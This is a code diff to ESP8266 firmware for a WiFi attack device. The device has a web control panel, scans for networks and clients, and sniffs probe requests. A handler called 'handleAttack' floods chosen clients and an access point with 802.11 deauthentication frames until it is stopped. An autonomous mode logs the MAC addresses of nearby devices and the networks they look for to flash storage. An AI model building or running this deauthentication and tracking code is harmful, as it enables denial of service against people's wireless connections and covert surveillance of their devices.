@@ -9,23 +9,20 @@
 #define LED_PIN LED_BUILTIN
 
 // --- Data Structures ---
-// 802.11 MAC Header
 struct MacHeader {
   uint8_t frameControl[2];
   uint8_t duration[2];
-  uint8_t addr1[6]; // Receiver
-  uint8_t addr2[6]; // Transmitter
-  uint8_t addr3[6]; // BSSID
+  uint8_t addr1[6];
+  uint8_t addr2[6];
+  uint8_t addr3[6];
   uint8_t sequenceControl[2];
 };
 
-// Deauthentication Frame
 struct DeauthFrame {
   MacHeader macHeader;
   uint8_t reasonCode[2];
 };
 
-// Structure to hold found probe requests
 struct ProbeRequest {
     String clientMac;
     String ssid;
@@ -46,6 +43,10 @@ ProbeRequest foundProbes[MAX_RESULTS];
 int probeCount = 0;
 String targetBSSID = "";
 int sniffingChannel = 0;
+
+// --- Autonomous Mode Globals ---
+String loggedProbes[100]; 
+int loggedProbeCount = 0;
 
 // --- Helper Functions ---
 String getEncryptionType(uint8_t type) {
@@ -88,39 +89,64 @@ void addProbe(String mac, String ssid) {
     probeCount++;
 }
 
-// --- The Core Packet Sniffer Callback ---
+// --- Sniffer Callbacks ---
 void universalSnifferCallback(uint8_t *buffer, uint16_t length) {
   MacHeader *header = (MacHeader*)buffer;
-  
-  // Frame Type and Subtype
   uint8_t frameType = (header->frameControl[0] >> 2) & 0b11;
   uint8_t frameSubtype = (header->frameControl[0] >> 4) & 0b1111;
 
-  // --- Client Scanning Logic (Data Frames) ---
-  if (frameType == 0b10) { // Data Frame
-    String addr1_str = macToString(header->addr1); // Destination
-    String addr2_str = macToString(header->addr2); // Source
-    if (addr1_str == targetBSSID && addr2_str != "FF:FF:FF:FF:FF:FF") {
-        addClient(addr2_str);
-    }
-    if (addr2_str == targetBSSID && addr1_str != "FF:FF:FF:FF:FF:FF") {
-        addClient(addr1_str);
-    }
+  if (frameType == 0b10) { // Data Frame for client scanning
+    String addr1_str = macToString(header->addr1);
+    String addr2_str = macToString(header->addr2);
+    if (addr1_str == targetBSSID && addr2_str != "FF:FF:FF:FF:FF:FF") addClient(addr2_str);
+    if (addr2_str == targetBSSID && addr1_str != "FF:FF:FF:FF:FF:FF") addClient(addr1_str);
   }
-  // --- Probe Request Sniffing Logic (Management Frames) ---
   else if (frameType == 0b00 && frameSubtype == 0b0100) { // Management Frame, Probe Request
-      String clientMac = macToString(header->addr2); // The sender of the probe is the client
-      // The SSID is in a tagged parameter at the end of the packet
-      if (length > sizeof(MacHeader)) {
+      if (length > sizeof(MacHeader) + 1) {
           int ssidLen = buffer[sizeof(MacHeader) + 1];
           if (ssidLen > 0 && ssidLen <= 32) {
               char ssid[ssidLen + 1];
               memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
               ssid[ssidLen] = '\0';
-              addProbe(clientMac, String(ssid));
+              addProbe(macToString(header->addr2), String(ssid));
           }
       }
   }
+}
+
+void autonomousSnifferCallback(uint8_t *buffer, uint16_t length) {
+    if (length > sizeof(MacHeader) + 2) {
+        MacHeader *header = (MacHeader*)buffer;
+        if (((header->frameControl[0] >> 2) & 0b11) == 0b00 && ((header->frameControl[0] >> 4) & 0b1111) == 0b0100) {
+            int ssidLen = buffer[sizeof(MacHeader) + 1];
+            if (ssidLen > 0 && ssidLen <= 32) {
+                char ssid[ssidLen + 1];
+                memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
+                ssid[ssidLen] = '\0';
+                
+                String mac = macToString(header->addr2);
+                String ssidStr = String(ssid);
+                String probeSignature = mac + "->" + ssidStr;
+                
+                bool alreadyLogged = false;
+                for(int i=0; i<loggedProbeCount; i++) {
+                    if(loggedProbes[i] == probeSignature) {
+                        alreadyLogged = true;
+                        break;
+                    }
+                }
+
+                if (!alreadyLogged && loggedProbeCount < 100) {
+                    File logFile = LittleFS.open("/probes.log", "a");
+                    if(logFile) {
+                        logFile.println(String(millis()) + "," + mac + "," + ssidStr);
+                        logFile.close();
+                        loggedProbes[loggedProbeCount++] = probeSignature;
+                    }
+                }
+            }
+        }
+    }
 }
 
 // --- Attack Function ---
@@ -137,14 +163,34 @@ void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* client_mac) {
 }
 
 // --- Web Server Handlers ---
-// (handleRoot, handleScan, handleAttack, handleStop, handleLogs, handleDownload, handleNotFound remain the same)
-void handleRoot() { /* ... same as before ... */ }
-void handleScan() { /* ... same as before ... */ }
-void handleAttack() { /* ... same as before ... */ }
-void handleStop() { /* ... same as before ... */ }
-void handleLogs() { /* ... same as before ... */ }
-void handleDownload() { /* ... same as before ... */ }
-void handleNotFound() { /* ... same as before ... */ }
+void handleRoot() {
+  if (LittleFS.exists("/index.html")) {
+    File file = LittleFS.open("/index.html", "r");
+    server.streamFile(file, "text/html");
+    file.close();
+  } else {
+    server.send(404, "text/plain", "Error: index.html not found.");
+  }
+}
+
+void handleScan() {
+  int n = WiFi.scanNetworks();
+  String html = "";
+  if (n > 0) {
+    for (int i = 0; i < n; ++i) {
+      String rssi_color = "text-green-300";
+      if(WiFi.RSSI(i) < -70) rssi_color = "text-yellow-400";
+      if(WiFi.RSSI(i) < -80) rssi_color = "text-red-400";
+      String radioValue = WiFi.BSSIDstr(i) + "," + String(WiFi.channel(i));
+      html += "<tr><td class='px-4 py-3 font-medium text-green-300'>" + WiFi.SSID(i) + "</td><td class='px-4 py-3 text-green-500'>" + WiFi.BSSIDstr(i) + "</td><td class='px-4 py-3 " + rssi_color + " font-semibold'>" + String(WiFi.RSSI(i)) + "</td><td class='px-4 py-3 text-green-500'>" + String(WiFi.channel(i)) + "</td><td class='px-4 py-3'><span class='";
+      html += (WiFi.encryptionType(i) == ENC_TYPE_NONE ? "text-red-400" : "text-green-300");
+      html += "'>" + getEncryptionType(WiFi.encryptionType(i)) + "</span></td><td class='px-4 py-3'><input type='radio' name='target_ap' class='form-radio h-4 w-4 bg-gray-900 border-green-700' value='" + radioValue + "'></td></tr>";
+    }
+  } else {
+      html = "<tr><td colspan='6' class='text-center px-4 py-3 text-gray-500'>No networks found.</td></tr>";
+  }
+  server.send(200, "text/html", html);
+}
 
 void handleClientScan() {
     if (!server.hasArg("target")) { server.send(400, "text/plain", "Bad Request"); return; }
@@ -171,7 +217,6 @@ void handleClientScan() {
     server.send(200, "text/html", html);
 }
 
-// *** NEW: Handler for Probe Sniffing ***
 void handleProbeSniff() {
     if (!server.hasArg("channel")) { server.send(400, "text/plain", "Bad Request: Missing channel."); return; }
     stopProcess = false;
@@ -200,42 +245,75 @@ void handleProbeSniff() {
     server.send(200, "text/html", html);
 }
 
+void handleAttack() {
+    if (!server.hasArg("ap_bssid") || !server.hasArg("channel") || !server.hasArg("clients")) { server.send(400, "text/plain", "Bad Request"); return; }
+    stopProcess = false;
+    int channel = server.arg("channel").toInt();
+    String ap_bssid_str = server.arg("ap_bssid");
+    String clients_str = server.arg("clients");
+    uint8_t ap_mac[6];
+    stringToMac(ap_bssid_str, ap_mac);
+    server.send(200, "text/plain", "OK. Attack started.");
+    wifi_set_channel(channel);
+    while(!stopProcess) {
+        int currentPos = 0;
+        while(currentPos < clients_str.length()) {
+            int nextPos = clients_str.indexOf(',', currentPos);
+            if (nextPos == -1) nextPos = clients_str.length();
+            String client_mac_str = clients_str.substring(currentPos, nextPos);
+            uint8_t client_mac[6];
+            stringToMac(client_mac_str, client_mac);
+            sendDeauthFrame(ap_mac, client_mac);
+            sendDeauthFrame(client_mac, ap_mac);
+            currentPos = nextPos + 1;
+        }
+        server.handleClient();
+        delay(2);
+    }
+}
+
+void handleStop() {
+    stopProcess = true;
+    server.send(200, "text/plain", "OK. Process will be stopped.");
+}
+
+void handleLogs() {
+    String html = "<html><body style='font-family: monospace; background-color: #0D0D0D; color: #3bff01;'><h1>Log Files</h1>";
+    Dir dir = LittleFS.openDir("/");
+    while (dir.next()) {
+        html += "<a href='/download?file=" + dir.fileName() + "' style='color: #3bff01;'>" + dir.fileName() + "</a> (" + dir.fileSize() + " bytes)<br>";
+    }
+    html += "</body></html>";
+    server.send(200, "text/html", html);
+}
+
+void handleDownload() {
+    if (server.hasArg("file")) {
+        String fileName = server.arg("file");
+        if (LittleFS.exists(fileName)) {
+            File file = LittleFS.open(fileName, "r");
+            server.streamFile(file, "text/plain");
+            file.close();
+        } else {
+            server.send(404, "text/plain", "File Not Found");
+        }
+    } else {
+        server.send(400, "text/plain", "Bad Request");
+    }
+}
+
+
+void handleNotFound() {
+  server.send(404, "text/plain", "Not Found");
+}
 
 // --- OPTIMIZED Autonomous Mode ---
 void runAutonomousMode() {
     pinMode(LED_PIN, OUTPUT);
     digitalWrite(LED_PIN, HIGH);
     String loggedBSSIDs[100]; int loggedBSSIDCount = 0;
-    String loggedProbes[100]; int loggedProbeCount = 0;
     
-    auto logProbe = [&](String mac, String ssid) {
-        if (loggedProbeCount >= 100) return;
-        String probeSignature = mac + "->" + ssid;
-        for(int i=0; i<loggedProbeCount; i++) {
-            if(loggedProbes[i] == probeSignature) return;
-        }
-        File logFile = LittleFS.open("/probes.log", "a");
-        if(logFile) {
-            logFile.println(String(millis()) + "," + mac + "," + ssid);
-            logFile.close();
-            loggedProbes[loggedProbeCount++] = probeSignature;
-        }
-    };
-    
-    wifi_set_promiscuous_rx_cb([&](uint8_t *buffer, uint16_t length){
-        if (length > sizeof(MacHeader) + 2) {
-            MacHeader *header = (MacHeader*)buffer;
-            if (((header->frameControl[0] >> 2) & 0b11) == 0b00 && ((header->frameControl[0] >> 4) & 0b1111) == 0b0100) {
-                int ssidLen = buffer[sizeof(MacHeader) + 1];
-                if (ssidLen > 0 && ssidLen <= 32) {
-                    char ssid[ssidLen + 1];
-                    memcpy(ssid, &buffer[sizeof(MacHeader) + 2], ssidLen);
-                    ssid[ssidLen] = '\0';
-                    logProbe(macToString(header->addr2), String(ssid));
-                }
-            }
-        }
-    });
+    wifi_set_promiscuous_rx_cb(autonomousSnifferCallback);
 
     while(true) {
         digitalWrite(LED_PIN, LOW); delay(50); digitalWrite(LED_PIN, HIGH); delay(50);
@@ -303,7 +381,7 @@ void setup() {
   server.on("/", HTTP_GET, handleRoot);
   server.on("/scan", HTTP_GET, handleScan);
   server.on("/clients", HTTP_GET, handleClientScan);
-  server.on("/probes", HTTP_GET, handleProbeSniff); // NEW
+  server.on("/probes", HTTP_GET, handleProbeSniff);
   server.on("/attack", HTTP_POST, handleAttack);
   server.on("/stop", HTTP_GET, handleStop);
   server.on("/logs", HTTP_GET, handleLogs);
